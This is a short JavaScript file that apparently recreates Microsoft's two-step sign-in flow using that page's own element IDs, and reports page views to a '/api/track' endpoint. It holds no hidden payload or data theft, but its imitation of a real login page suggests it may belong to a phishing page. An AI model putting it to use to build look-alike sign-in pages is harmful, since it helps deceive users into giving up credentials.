document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('i0281');
    const emailInput = document.getElementById('i0116');
    const passwordInput = document.getElementById('i0118');
    const submitButton = document.getElementById('idSIButton9');
    const loginHeader = document.getElementById('loginHeader');
    const emailRow = emailInput.closest('.row');
    const passwordRow = passwordInput.closest('.row');

    passwordRow.style.display = 'none';

    emailInput.focus();

    emailInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            e.preventDefault();
            showPasswordField();
        }
    });

    form.addEventListener('submit', function(e) {
        if (passwordRow.style.display === 'none') {
            e.preventDefault();
            showPasswordField();
        } else {
            if (!passwordInput.value.trim()) {
                e.preventDefault();
                passwordInput.focus();
                return false;
            }

            submitButton.value = "Signing in...";
            submitButton.disabled = true;
        }
    });

    function showPasswordField() {
        const emailValue = emailInput.value.trim();
        if (!emailValue) {
            emailInput.focus();
            return;
        }

        emailRow.style.display = 'none';
        passwordRow.style.display = 'block';
        passwordInput.focus();
        loginHeader.querySelector('div').innerText = emailValue;
    }

    // Tracking login page load
    function trackLoginAttempt() {
        fetch('/api/track', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                type: 'login_view',
                timestamp: new Date().toISOString()
            })
        }).catch(err => console.error(err));
    }

    trackLoginAttempt();
});
